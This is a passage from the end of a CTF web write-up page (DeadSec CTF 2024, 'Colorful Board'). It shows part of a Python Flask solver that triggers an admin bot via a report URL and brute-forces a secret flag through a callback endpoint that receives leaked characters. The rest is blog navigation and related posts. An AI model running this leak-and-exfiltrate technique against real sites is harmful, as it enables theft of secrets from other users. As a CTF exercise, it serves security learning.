    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sa">f</span><span class="sh">"</span><span class="s">admin/report?url=http://localhost:1337/post/edit/</span><span class="si">{</span><span class="n">post_id</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
    <span class="k">return</span>


<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/solve</span><span class="sh">"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">solve</span><span class="p">():</span>
    <span class="n">oldflag</span> <span class="o">=</span> <span class="n">flag</span>
    <span class="n">threads</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">charset</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">oldflag</span> <span class="o">!=</span> <span class="n">flag</span><span class="p">:</span>
            <span class="k">break</span>

        <span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">check_flag</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">i</span><span class="p">,))</span>
        <span class="n">t</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
        <span class="n">threads</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>

        <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">threads</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">max_threads</span><span class="p">:</span>
            <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">threads</span><span class="p">:</span>
                <span class="n">t</span><span class="p">.</span><span class="nf">join</span><span class="p">()</span>
            <span class="n">threads</span> <span class="o">=</span> <span class="p">[]</span>

    <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">threads</span><span class="p">:</span>
        <span class="n">t</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
    <span class="k">return</span> <span class="sh">"</span><span class="s">OK</span><span class="sh">"</span>


<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/oz/&lt;path:path&gt;</span><span class="sh">"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">catch_all</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">flag</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
    <span class="n">flag</span> <span class="o">=</span> <span class="n">path</span>

    <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">solve</span><span class="p">).</span><span class="nf">start</span><span class="p">()</span>

    <span class="k">return</span> <span class="sh">"</span><span class="s">OK</span><span class="sh">"</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="n">app</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="sh">"</span><span class="s">0.0.0.0</span><span class="sh">"</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">80</span><span class="p">)</span>
</code></pre></div></div>

<p><img src="/assets/images/deadsec-writeups/colorful-board-04.png" alt="Colorful Board" /></p>


<ul class="taxonomy__index">
  
  
    <li>
      <a href="#2024">
        <strong>2024</strong> <span class="taxonomy__count">3</span>
      </a>
    </li>
  
</ul>




  <section id="2024" class="taxonomy__section">
    <h2 class="archive__subtitle">2024</h2>
    <div class="entries-list">
      
        



<div class="list__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/writeups/deadsec-ctf-2024" rel="permalink">DeadSec CTF 2024 Web Writeups
</a>
      
    </h2>
    

  <p class="page__meta">
    

    

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          12 minute read
        
      </span>
    
  </p>


    <p class="archive__item-excerpt" itemprop="description">This is a collection of writeups for the Web challenges of DeadSec CTF 2024. The CTF was held by the DeadSec team. The CTF was held on 28th July 2024. My tea...</p>
  </article>
</div>

      
        



<div class="list__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/writeups/ncsc-training-2024" rel="permalink">NCSC Training 2024 Writeups
</a>
      
    </h2>
    

  <p class="page__meta">
    

    

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          8 minute read
        
      </span>
    
  </p>


    <p class="archive__item-excerpt" itemprop="description">Here are the write-ups for the challenges from the NCSC Training 2024 CTF, which took place from July 11th to July 13th, 2024.
</p>
  </article>
</div>

      
        



<div class="list__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/writeups/metactf-v5-2024" rel="permalink">MetaCTF v5 2024 Writeups
</a>
      
    </h2>
    

  <p class="page__meta">
    

    

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          9 minute read
        
      </span>
    
  </p>


    <p class="archive__item-excerpt" itemprop="description">Writeups for the MetaCTF v5 2024 CTF Web Challenges that was held on 30th June 2024.
</p>
  </article>
</div>

      
    </div>
    <a href="#page-title" class="back-to-top">Back to top &uarr;</a>
  </section>


        
      </section>

      <footer class="page__meta">
        
        
  


  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      <a href="/tags/#ctf" class="page__taxonomy-item p-category" rel="tag">ctf</a><span class="sep">, </span>
    
      <a href="/tags/#deadsec-ctf" class="page__taxonomy-item p-category" rel="tag">deadsec-ctf</a><span class="sep">, </span>
    
      <a href="/tags/#writeups" class="page__taxonomy-item p-category" rel="tag">writeups</a>
    
    </span>
  </p>




  


  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      <a href="/categories/#ctf" class="page__taxonomy-item p-category" rel="tag">CTF</a><span class="sep">, </span>
    
      <a href="/categories/#writeups" class="page__taxonomy-item p-category" rel="tag">Writeups</a>
    
    </span>
  </p>


        

  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2024-07-28T00:00:00+03:00">July 28, 2024</time></p>

      </footer>

      <section class="page__share">
  
    <h4 class="page__share-title">Share on</h4>
  

  <a href="https://twitter.com/intent/tweet?text=DeadSec+CTF+2024+Web+Writeups%20http%3A%2F%2F0.0.0.0%3A8000%2Fwriteups%2Fdeadsec-ctf-2024" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>

  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2F0.0.0.0%3A8000%2Fwriteups%2Fdeadsec-ctf-2024" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>

  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http://0.0.0.0:8000/writeups/deadsec-ctf-2024" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
</section>


      
  <nav class="pagination">
    
      <a href="/writeups/ncsc-training-2024" class="pagination--pager" title="NCSC Training 2024 Writeups
">Previous</a>
    
    
      <a href="#" class="pagination--pager disabled">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
    
<div class="page__related">
  
  <h2 class="page__related-title">You may also enjoy</h2>
  <div class="grid__wrapper">
    
      
      



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src="/assets/images/ncsc-training-writeups/ncsc-training-2024.jpg" alt="">
      </div>
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/writeups/ncsc-training-2024" rel="permalink">NCSC Training 2024 Writeups
</a>
      
    </h2>
    

  <p class="page__meta">
    

    

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          8 minute read
        
      </span>
    
  </p>


    <p class="archive__item-excerpt" itemprop="description">Here are the write-ups for the challenges from the NCSC Training 2024 CTF, which took place from July 11th to July 13th, 2024.
</p>
  </article>
</div>

    
      
      



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src="/assets/images/metactf-writeups/metactfv5.png" alt="">
      </div>
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/writeups/metactf-v5-2024" rel="permalink">MetaCTF v5 2024 Writeups
</a>
      
    </h2>
    

  <p class="page__meta">
    

    

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          9 minute read
        
      </span>
    
  </p>


    <p class="archive__item-excerpt" itemprop="description">Writeups for the MetaCTF v5 2024 CTF Web Challenges that was held on 30th June 2024.
</p>
  </article>
</div>

    
  </div>
</div>

  
  
</div>

      
    </div>

    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    
      <li><strong>Follow:</strong></li>
    

    
      
        
      
        
      
        
          <li><a href="https://github.com/0x0OZ" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
        
      
        
      
        
      
        
          <li><a href="https://instagram.com/0x0oz_" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i> Instagram</a></li>
        
      
    

    
      <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
    
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2024 <a href="http://0.0.0.0:8000">0xOZ</a>. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/jekyll-themes/minimal-mistakes/" rel="nofollow">Minimal Mistakes</a>.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>









  </body>
</html>
